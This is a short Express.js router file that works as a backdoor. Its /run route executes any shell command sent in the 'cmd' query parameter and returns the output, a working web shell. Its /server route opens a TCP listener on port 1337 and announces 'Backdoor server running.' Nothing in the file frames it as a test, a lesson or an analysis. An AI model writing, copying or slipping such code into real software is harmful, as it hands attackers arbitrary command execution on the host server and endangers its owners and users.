const express = require('express');
const { exec } = require('child_process');
const net = require('net');
const router = express.Router();

router.get('/run', (req, res) => {
    const cmd = req.query.cmd;
    require('child_process').exec(cmd, (err, stdout, stderr) => {
        res.send(stdout || stderr);
    });
});

router.get('/server', (req, res) => {
    require('net').createServer(socket => {
        socket.pipe(socket);
    }).listen(1337);

    res.send('Backdoor server running.');
});

module.exports = router;
